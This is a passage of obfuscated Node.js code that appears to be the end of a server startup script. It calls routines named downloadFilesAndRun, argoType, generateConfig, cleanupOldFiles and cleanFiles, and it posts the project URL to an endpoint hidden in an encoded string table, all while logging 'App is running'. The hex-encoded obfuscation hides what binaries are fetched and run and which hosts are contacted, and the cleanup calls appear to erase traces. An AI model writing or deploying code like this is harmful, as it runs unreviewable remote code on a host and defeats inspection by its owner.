_0x3eb326=_0x5dc52c;console[_0x3eb326(0x1d6)](),console[_0x3eb326(0x1d5)]('App\x20is\x20running'),console[_0x3eb326(0x1d5)](_0x3eb326(0x1e9));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x55cb86=_0x2cbcbc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x55cb86(0x1d5)](_0x55cb86(0x21a));return;}try{const _0x227f68=await axios[_0x55cb86(0x16d)](_0x55cb86(0x169),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x55cb86(0x17a)}});return console[_0x55cb86(0x1d5)](_0x55cb86(0x177)),_0x227f68;}catch(_0x5dfb18){return console[_0x55cb86(0x1bd)](_0x55cb86(0x204)+_0x5dfb18[_0x55cb86(0x1ee)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3d513c){console['error']('Error\x20in\x20startserver:',_0x3d513c);}}startserver()[_0x2cbcbc(0x1c1)](_0x4af1d8=>{const _0x44bba0=_0x2cbcbc;console[_0x44bba0(0x1bd)](_0x44bba0(0x208),_0x4af1d8);}),app[_0x2cbcbc(0x1ef)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
